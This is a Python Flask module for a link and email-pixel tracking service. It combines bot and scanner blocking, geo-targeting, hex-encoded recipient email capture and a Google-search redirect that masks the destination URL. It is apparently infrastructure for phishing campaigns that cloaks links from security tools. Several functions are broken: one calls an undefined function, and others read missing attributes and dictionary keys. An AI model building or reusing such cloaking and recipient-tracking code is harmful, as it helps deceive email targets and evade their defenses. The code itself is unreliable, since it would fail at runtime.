from flask import Blueprint, request, redirect, jsonify, make_response, render_template_string
from src.models.link import Link
from src.models.tracking_event import TrackingEvent
from src.models.user import db
from src.models.notification import Notification
from src.utils.user_agent_parser import parse_user_agent, generate_unique_id
from src.services.antibot import antibot_service
from datetime import datetime
import requests
import json
import base64
import os

track_bp = Blueprint("track", __name__)

def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    elif request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    else:
        return request.remote_addr

def get_user_agent():
    return request.headers.get("User-Agent", "")

def get_geolocation(ip_address):
    """Enhanced geolocation with zip code and detailed ISP information"""
    try:
        # Using ip-api.com for comprehensive geolocation data
        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "Unknown"),
                    "country_code": data.get("countryCode", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "zip_code": data.get("zip"),
                    "latitude": data.get("lat"),
                    "longitude": data.get("lon"),
                    "timezone": data.get("timezone", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "organization": data.get("org", "Unknown"),
                    "as_number": data.get("as", "Unknown"),
                    "as_name": data.get("asname", "Unknown"),
                    "is_mobile": data.get("mobile", False),
                    "is_proxy": data.get("proxy", False),
                    "is_hosting": data.get("hosting", False)
                }
    except Exception as e:
        print(f"Geolocation error: {e}")
    
    return {
        "country": "Unknown",
        "country_code": "Unknown",
        "region": "Unknown",
        "city": "Unknown",
        "zip_code": "Unknown",
        "latitude": None,
        "longitude": None,
        "timezone": "Unknown",
        "isp": "Unknown",
        "organization": "Unknown",
        "as_number": "Unknown",
        "as_name": "Unknown",
        "is_mobile": False,
        "is_proxy": False,
        "is_hosting": False
    }

def check_geo_targeting(link, geo_data):
    """Enhanced geo targeting check with allow/block logic"""
    if not link.geo_targeting_enabled:
        return {"blocked": False, "reason": None}
    
    country = geo_data.get("country", "Unknown")
    region = geo_data.get("region", "Unknown")
    city = geo_data.get("city", "Unknown")
    
    # If location is unknown, block by default
    if country == "Unknown":
        return {"blocked": True, "reason": "unknown_location"}
    
    # Parse JSON arrays
    allowed_countries = json.loads(link.allowed_countries) if link.allowed_countries else []
    blocked_countries = json.loads(link.blocked_countries) if link.blocked_countries else []
    allowed_regions = json.loads(link.allowed_regions) if link.regions else []
    blocked_regions = json.loads(link.blocked_regions) if link.blocked_regions else []
    allowed_cities = json.loads(link.allowed_cities) if link.allowed_cities else []
    blocked_cities = json.loads(link.blocked_cities) if link.blocked_cities else []
    
    if link.geo_targeting_type == "allow":
        # Allow mode: only allow specified locations
        country_allowed = not allowed_countries or country in allowed_countries
        region_allowed = not allowed_regions or region in allowed_regions
        city_allowed = not allowed_cities or city in allowed_cities
        
        if not (country_allowed and region_allowed and city_allowed):
            if not country_allowed:
                return {"blocked": True, "reason": "country_not_allowed"}
            elif not region_allowed:
                return {"blocked": True, "reason": "region_not_allowed"}
            elif not city_allowed:
                return {"blocked": True, "reason": "city_not_allowed"}
    
    else:  # block mode
        # Block mode: block specified locations
        if country in blocked_countries:
            return {"blocked": True, "reason": "country_blocked"}
        if region in blocked_regions:
            return {"blocked": True, "reason": "region_blocked"}
        if city in blocked_cities:
            return {"blocked": True, "reason": "city_blocked"}
    
    return {"blocked": False, "reason": None}

@track_bp.route("/t/<short_code>")
def track_click(short_code):
    # Get the tracking link
    link = Link.query.filter_by(short_code=short_code).first()
    if not link:
        return "Link not found", 404
    
    # Collect tracking data
    ip_address = get_client_ip()
    user_agent = get_user_agent()
    timestamp = datetime.utcnow()
    referrer = request.headers.get("Referer", "")
    
    # Prepare request data for antibot service
    request_data = {
        "ip_address": ip_address,
        "user_agent": user_agent,
        "headers": dict(request.headers),
        "referrer": referrer,
        "timestamp": timestamp.timestamp()
    }
    
    # Analyze request with advanced anti-bot service
    antibot_analysis = antibot_service.analyze_request(request_data)
    is_bot = antibot_analysis["is_bot"]
    bot_block_reason = antibot_analysis["blocked_reason"]
    
    # Get geolocation data
    geo_data = get_geolocation(ip_address)
    
    # Parse user agent for device and browser info
    device_info = parse_user_agent(user_agent)
    
    # Social referrer check
    social_check = check_social_referrer()
    
    # Geo targeting check
    geo_check = check_geo_targeting(link, geo_data)
    
    # Generate unique ID for this tracking event
    unique_id = request.args.get("uid") or generate_unique_id()
    
    # Determine status and blocking
    status = "Open"  # Initial status when link is clicked
    block_reason = None
    should_redirect = True
    
    # Apply blocking rules
    if social_check["blocked"]:
        block_reason = social_check["reason"]
        status = "Blocked"
        should_redirect = False
    elif geo_check["blocked"]:
        block_reason = geo_check["reason"]
        status = "Blocked"
        should_redirect = False
    elif link.bot_blocking_enabled and is_bot:
        block_reason = bot_block_reason or "bot_detected_advanced"
        status = "Bot"
        should_redirect = False
    
    # Record the tracking event with enhanced data
    try:
        event = TrackingEvent(
            link_id=link.id,
            timestamp=timestamp,
            ip_address=ip_address,
            user_agent=user_agent,
            country=geo_data["country"],
            region=geo_data["region"],
            city=geo_data["city"],
            zip_code=geo_data["zip_code"],
            latitude=geo_data["latitude"],
            longitude=geo_data["lon"],
            timezone=geo_data["timezone"],
            isp=geo_data["isp"],
            organization=geo_data["organization"],
            as_number=geo_data["as_number"],
            device_type=device_info["device_type"],
            browser=device_info["browser"],
            browser_version=device_info["browser_version"],
            os=device_info["os"],
            os_version=device_info["os_version"],
            status=status,
            blocked_reason=block_reason,
            email_opened=False,  # This is a click, not an email open
            redirected=False,    # Will be updated when redirect happens
            on_page=False,       # Will be updated when user reaches landing page
            unique_id=unique_id,
            is_bot=is_bot,
            referrer=referrer,
            page_views=1,
            threat_score=antibot_analysis["threat_score"],
            bot_type=antibot_analysis["bot_type"]
        )
        
        db.session.add(event)
        db.session.commit()
        
        # Update status to "Redirected" if successful redirect
        if should_redirect:
            event.status = "Redirected"
            event.redirected = True
            db.session.commit()
        
    except Exception as e:
        db.session.rollback()
        print(f"Error recording tracking event: {e}")
    
    # Handle redirect or blocking
    if not should_redirect:
        _create_notification(
            link.user_id,
            "Bot Blocked!",
            f"A bot was blocked from accessing your link \'{link.campaign_name}\' ({link.short_code}). Reason: {block_reason}",
            "security",
            "high"
        )
        return f"Access blocked: {block_reason}", 403
    else:
        _create_notification(
            link.user_id,
            "New Click!",
            f"Your link \'{link.campaign_name}\' ({link.short_code}) received a new click.",
            "info",
            "low"
        )

    
    # Check for preview URL
    if hasattr(link, "preview_template_url") and link.preview_template_url and request.args.get("preview") != "skip":
        # Redirect to preview page first
        preview_url = f"{link.preview_template_url}?target={link.target_url}&uid={unique_id}"
        return redirect(preview_url)
    
    # Implement intermediate Google redirect
    domain_part = link.target_url.split("//")[1].split("/")[0]
    google_redirect_url = f"https://www.google.com/search?q=site%3A{domain_part}&btnI=I&safe=active&url={link.target_url}"
    return redirect(google_redirect_url)

@track_bp.route("/p/<short_code>")
def pixel_track(short_code):
    """Tracking pixel endpoint"""
    try:
        link = Link.query.filter_by(short_code=short_code).first()
        if not link:
            # Return 1x1 transparent pixel even if link not found
            return _get_transparent_pixel()
        
        # Collect tracking data
        ip_address = get_client_ip()
        user_agent = get_user_agent()
        timestamp = datetime.utcnow()
        referrer = request.headers.get("Referer", "")
        
        # Prepare request data for antibot service
        request_data = {
            "ip_address": ip_address,
            "user_agent": user_agent,
            "headers": dict(request.headers),
            "referrer": referrer,
            "timestamp": timestamp.timestamp()
        }
        
        # Analyze request with advanced anti-bot service
        antibot_analysis = antibot_service.analyze_request(request_data)
        is_bot = antibot_analysis["is_bot"]
        bot_block_reason = antibot_analysis["blocked_reason"]
        
        # Get geolocation data
        geo_data = get_geolocation(ip_address)
        
        # Social referrer check
        social_check = check_social_referrer()
        
        # Geo targeting check
        geo_check = check_geo_targeting(link, geo_data)
        
        event_status = "email_opened"
        block_reason = None
        
        # Apply blocking rules
        if social_check["blocked"]:
            block_reason = social_check["reason"]
            event_status = "blocked"
        elif geo_check["blocked"]:
            block_reason = geo_check["reason"]
            event_status = "blocked"
        elif link.bot_blocking_enabled and is_bot:
            block_reason = bot_block_reason or "bot_detected_advanced"
            event_status = "blocked"
        
        # Record the tracking event
        captured_email_hex = request.args.get("email")  # Get hex-encoded email from pixel URL
        captured_email = _decode_hex_email(captured_email_hex) if captured_email_hex else None
        unique_id = request.args.get("id") or request.args.get("uid")  # Get unique ID
        
        # Parse user agent for device and browser info
        device_info = parse_user_agent(user_agent)
        
        event = TrackingEvent(
            link_id=link.id,
            timestamp=timestamp,
            ip_address=ip_address,
            user_agent=user_agent,
            country=geo_data["country"],
            region=geo_data["region"],
            city=geo_data["city"],
            zip_code=geo_data["zip_code"],
            latitude=geo_data["latitude"],
            longitude=geo_data["lon"],
            timezone=geo_data["timezone"],
            isp=geo_data["isp"],
            organization=geo_data["organization"],
            as_number=geo_data["as_number"],
            device_type=device_info["device_type"],
            browser=device_info["browser"],
            browser_version=device_info["browser_version"],
            os=device_info["os"],
            os_version=device_info["os_version"],
            captured_email=captured_email,  # Store captured email
            status=event_status,
            blocked_reason=block_reason,
            email_opened=True,  # This is an email open
            redirected=False,   # Not a redirect yet
            on_page=False,      # Not on page yet
            unique_id=unique_id,  # Store unique ID
            is_bot=is_bot,
            referrer=request.headers.get("Referer", ""),
            page_views=1,
            threat_score=antibot_analysis["threat_score"],
            bot_type=antibot_analysis["bot_type"]
        )
        
        db.session.add(event)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        print(f"Pixel tracking error: {e}")
    
    return _get_transparent_pixel()

def _get_transparent_pixel():
    """Return a 1x1 transparent PNG pixel"""
    from flask import Response
    
    # 1x1 transparent PNG
    pixel_data = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")
    
    response = Response(pixel_data, mimetype="image/png")
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    
    return response

@track_bp.route("/track/page-landed", methods=["POST"])
def page_landed():
    """Update tracking event status when user lands on target page"""
    data = request.get_json()
    unique_id = data.get("unique_id")
    link_id = data.get("link_id")
    
    if not unique_id and not link_id:
        return jsonify({"success": False, "error": "Missing unique_id or link_id"}), 400
    
    try:
        # Find the tracking event by unique_id or link_id
        if unique_id:
            event = TrackingEvent.query.filter_by(unique_id=unique_id).first()
        elif link_id:
            event = TrackingEvent.query.filter_by(link_id=link_id).order_by(TrackingEvent.timestamp.desc()).first()
        else:
            return jsonify({"success": False, "error": "No matching tracking event found"}), 404

        if event:
            event.on_page = True
            db.session.commit()
            return jsonify({"success": True, "message": "Page landed status updated"}), 200
        else:
            return jsonify({"success": False, "error": "No matching tracking event found"}), 404
    except Exception as e:
        db.session.rollback()
        print(f"Error updating page landed status: {e}")
        return jsonify({"success": False, "error": "Failed to update page landed status"}), 500




def _decode_hex_email(hex_string):
    """Decode a hex-encoded email string."""
    try:
        return bytes.fromhex(hex_string).decode("utf-8")
    except (ValueError, TypeError):
        return None



def _create_notification(user_id, title, message, type="info", priority="medium"):
    try:
        notification = Notification(
            user_id=user_id,
            title=title,
            message=message,
            type=type,
            priority=priority
        )
        db.session.add(notification)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        print(f"Error creating notification: {e}")

